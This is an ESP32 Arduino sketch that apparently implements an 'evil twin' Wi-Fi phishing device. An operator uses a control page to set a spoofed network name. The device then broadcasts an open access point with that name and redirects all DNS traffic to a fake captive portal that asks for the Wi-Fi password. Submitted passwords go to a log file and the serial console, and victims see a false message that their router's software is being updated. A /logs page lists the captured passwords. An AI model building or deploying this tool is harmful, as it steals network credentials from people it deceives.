#include <WiFi.h>
#include <DNSServer.h>
#include <ESPAsyncWebServer.h>
#include <AsyncTCP.h>
#include "SPIFFS.h"

const char* manageSSID = "SureWifi";
const char* managePassword = "The0PassP0";
AsyncWebServer server(80);
DNSServer dnsServer;

String captiveSSID = "NewNetworkSSID";

void startCaptivePortal() {
    WiFi.softAP(captiveSSID.c_str());
    Serial.println("Captive Portal WiFi Network Started: " + captiveSSID);

    dnsServer.start(53, "*", WiFi.softAPIP());

    server.onNotFound([](AsyncWebServerRequest *request) {
    AsyncResponseStream *response = request->beginResponseStream("text/html; charset=utf-8");
    response->print(R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Connect to Wi-Fi</title>
<style>
  body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
  .container { background-color: #fff; padding: 20px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.2); max-width: 400px; width: 100%; animation: scaleUp 0.3s ease-in-out; }
  h1 { color: #0056b3; text-align: center; }
  p { text-align: center; font-size: 1.2em; margin: 20px 0; }
  form { display: flex; flex-direction: column; }
  input[type="password"], button[type="submit"] { padding: 12px; margin-bottom: 10px; border-radius: 5px; border: 1px solid #ccc; font-size: 1em; }
  button[type="submit"] { background-color: #4CAF50; color: white; border: none; cursor: pointer; transition: background-color 0.3s ease; }
  button[type="submit"]:hover { background-color: #45a049; }
  @keyframes scaleUp {
    from { transform: scale(0.8); opacity: 0; }
    to { transform: scale(1); opacity: 1; }
  }
  @media (max-width: 400px) {
    .container { padding: 15px; }
    h1, p { margin: 15px 0; }
  }
</style>
</head>
<body>
<div class="container">
  <h1>Welcome!</h1>
  <p>Please enter your Wi-Fi password to connect.</p>
  <form action="/submit" method="POST">
    Password: <input type="password" name="password" required>
    <button type="submit">Connect</button>
  </form>
</div>
</body>
</html>
    )rawliteral");
    request->send(response);
});

}

void setup() {
    Serial.begin(115200);
    
    if (!SPIFFS.begin(true)) {
        Serial.println("An Error has occurred while mounting SPIFFS");
        return;
    }
    Serial.println("SPIFFS mounted successfully");

    
    WiFi.softAP(manageSSID, managePassword);
    Serial.print("Management WiFi Network Started: ");
    Serial.println(WiFi.softAPIP());

    
    server.on("/control", HTTP_GET, [](AsyncWebServerRequest *request) {
  request->send(200, "text/html; charset=utf-8", R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Control Panel</title>
<style>
  body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
  .container { width: 100%; max-width: 600px; background-color: #fff; padding: 20px; margin: 20px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
  h2 { color: #0056b3; text-align: center; margin-bottom: 20px; }
  form { display: flex; flex-direction: column; }
  input[type="text"], input[type="submit"] { padding: 12px; margin-bottom: 10px; border-radius: 5px; border: 1px solid #ccc; font-size: 16px; }
  input[type="submit"] { background-color: #4CAF50; color: white; border: none; cursor: pointer; transition: background-color 0.3s ease; }
  input[type="submit"]:hover { background-color: #45a049; }
  /* Modal styles */
  .modal { display: none; position: fixed; z-index: 1; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgba(0,0,0,0.4); }
  .modal-content { background-color: #fefefe; margin: 15% auto; padding: 20px; border: 1px solid #888; width: 80%; max-width: 300px; border-radius: 10px; text-align: center; }
</style>
</head>
<body>
<div class="container">
  <h2>WiFi SSID Setup</h2>
  <form action="/setssid" method="POST" onsubmit="showModal()">
    <input type="text" name="ssid" placeholder="Enter new SSID" required>
    <input type="submit" value="RUN">
  </form>
</div>
<!-- Modal -->
<div id="myModal" class="modal">
  <div class="modal-content">
    <p>TeaVin Launched!</p>
  </div>
</div>
<script>
function showModal() {
  var modal = document.getElementById("myModal");
  modal.style.display = "block";
  setTimeout(function(){ modal.style.display = "none"; }, 3000);
}
</script>
</body>
</html>
  )rawliteral");
});




    server.on("/setssid", HTTP_POST, [](AsyncWebServerRequest *request) {
        if (request->hasParam("ssid", true)) {
            captiveSSID = request->getParam("ssid", true)->value();
            // Disconnect SureWifi before starting the Captive Portal
            WiFi.softAPdisconnect(true);
            delay(1000); // Ensure the previous network is fully disconnected
            startCaptivePortal();
        } else {
            request->send(200, "text/plain", "SSID is required.");
        }
    });

    
    server.on("/submit", HTTP_POST, [](AsyncWebServerRequest *request) {
        if (request->hasParam("password", true)) {
            String password = request->getParam("password", true)->value();
            File logFile = SPIFFS.open("/logs.txt", FILE_APPEND);
            if (logFile) {
                logFile.println("Password: " + password);
                logFile.close();
            }
            Serial.println("Password entered: " + password);
        }
        request->redirect("/thankyou");
    });

    
    server.on("/thankyou", HTTP_GET, [](AsyncWebServerRequest *request) {
    String thankYouPage = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Thank You!</title>
<style>
  body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
  .container { background-color: #fff; padding: 20px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.2); animation: scaleUp 0.3s ease-in-out; }
  h1 { color: #0056b3; text-align: center; }
  p { text-align: center; font-size: 1.2em; }
  @keyframes scaleUp {
    from { transform: scale(0.8); opacity: 0; }
    to { transform: scale(1); opacity: 1; }
  }
  @media (max-width: 400px) {
    .container { padding: 15px; }
    h1 { font-size: 1.4em; }
    p { font-size: 1em; }
  }
</style>
</head>
<body>
<div class="container">
  <h1>Thank You!</h1>
  <p>Your password has been received. We are updating your router's software.</p>
</div>
</body>
</html>
    )rawliteral";
    request->send(200, "text/html", thankYouPage);
});


    
    server.on("/logs", HTTP_GET, [](AsyncWebServerRequest *request) {
    String logsPage = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Logs</title>
<style>
  body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; background-color: #f0f2f5; }
  .container { max-width: 600px; margin: auto; padding: 20px; }
  .log { background-color: #ffffff; border-radius: 10px; padding: 10px; margin: 10px 0; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
  .log p { margin: 10px 0; }
  .header { background-color: #0056b3; color: #ffffff; padding: 20px; border-radius: 10px 10px 0 0; text-align: center; }
  .clear-btn { display: block; width: calc(100% - 40px); background-color: #ff4757; color: #ffffff; border: none; padding: 15px; border-radius: 10px; cursor: pointer; font-size: 16px; margin: 20px auto; box-shadow: 0 4px 8px rgba(0,0,0,0.2); }
  .clear-btn:hover { background-color: #ff6b81; }
</style>
</head>
<body>
<div class="container">
  <div class="header">
    <h2>Logs</h2>
  </div>
)rawliteral";

    File logFile = SPIFFS.open("/logs.txt", "r");
    bool hasLogs = false;
    if (logFile) {
        while (logFile.available()) {
            hasLogs = true;
            String logEntry = logFile.readStringUntil('\n');
            logsPage += "<div class='log'><p>" + logEntry + "</p></div>";
        }
        logFile.close();
    }
    if (!hasLogs) {
        logsPage += "<div class='log'><p>No logs found.</p></div>";
    }

    logsPage += R"rawliteral(
  <form action='/clearLogs' method='post'>
    <button class='clear-btn' type='submit'>Clear Logs</button>
  </form>
</div>
</body>
</html>
)rawliteral";

    request->send(200, "text/html", logsPage);
});



    
    server.on("/clearLogs", HTTP_POST, [](AsyncWebServerRequest *request) {
        SPIFFS.remove("/logs.txt");
        request->redirect("/logs");
    });

    // Start the server for initial setup via SureWifi
    server.begin();
    Serial.println("HTTP server started");
}

void loop() {
    dnsServer.processNextRequest(); 
}

